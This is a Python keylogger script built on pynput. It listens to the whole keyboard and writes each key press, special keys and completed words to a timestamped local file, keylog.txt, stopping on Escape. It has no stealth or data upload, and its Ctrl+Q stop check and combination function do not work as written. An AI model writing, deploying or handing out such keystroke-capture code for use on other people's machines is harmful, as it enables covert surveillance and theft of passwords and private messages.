from pynput.keyboard import Listener, Key
import logging
import time

# Set up logging configuration to save keystrokes to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

# To store the current sequence of keys being pressed (for word detection)
current_keys = []

# To store combination of keys pressed
pressed_keys = []

# Function to log each key pressed
def on_press(key):
    try:
        # If it's a printable key, add it to the current word sequence
        if hasattr(key, 'char') and key.char:
            current_keys.append(key.char)
            logging.info(f"Key {key.char} pressed")

        else:
            # Log special keys like space, enter, shift, ctrl, etc.
            if key == Key.space:
                current_keys.append(" ")
                logging.info("Space pressed")
            elif key == Key.enter:
                current_keys.append("\n")
                log_word()  # Log the current word when Enter is pressed
                logging.info("Enter pressed")
            elif key == Key.backspace:
                current_keys.append("<Backspace>")
                logging.info("Backspace pressed")
            elif key == Key.shift or key == Key.shift_r:
                pressed_keys.append('Shift')
                logging.info("Shift key pressed")
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                pressed_keys.append('Ctrl')
                logging.info("Ctrl key pressed")
            elif key == Key.alt_l or key == Key.alt_r:
                pressed_keys.append('Alt')
                logging.info("Alt key pressed")
            elif key == Key.caps_lock:
                logging.info("Caps Lock toggled")
            else:
                logging.info(f"Special key {key} pressed")

    except AttributeError:
        # Catch errors for non-character keys like special function keys
        logging.info(f"Special key {key} pressed")

# Function to log a completed word when the enter key is pressed
def log_word():
    word = ''.join(current_keys).strip()
    if word:  # Only log non-empty words
        logging.info(f"Word logged: {word}")
    current_keys.clear()  # Reset the current sequence after logging the word

# Function to stop the listener on pressing 'Ctrl + Q' combination
def on_release(key):
    # Stop the listener if Ctrl + Q is pressed
    if key == Key.esc:  # Escape key can still stop the listener
        return False
    if Key.ctrl_l in pressed_keys and key == Key.q:
        logging.info("Ctrl + Q pressed, stopping the keylogger.")
        return False
    # If Enter is pressed, log the word formed
    if key == Key.enter:
        log_word()

# Function to periodically log key combinations and word detection
def check_combinations():
    # This function can log any combinations of keys like 'Ctrl + C' or 'Shift + A'
    if 'Ctrl' in pressed_keys:
        if 'C' in pressed_keys:
            logging.info("Ctrl + C pressed (copy)")
        if 'V' in pressed_keys:
            logging.info("Ctrl + V pressed (paste)")
        pressed_keys.clear()

# Start the listener to capture key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
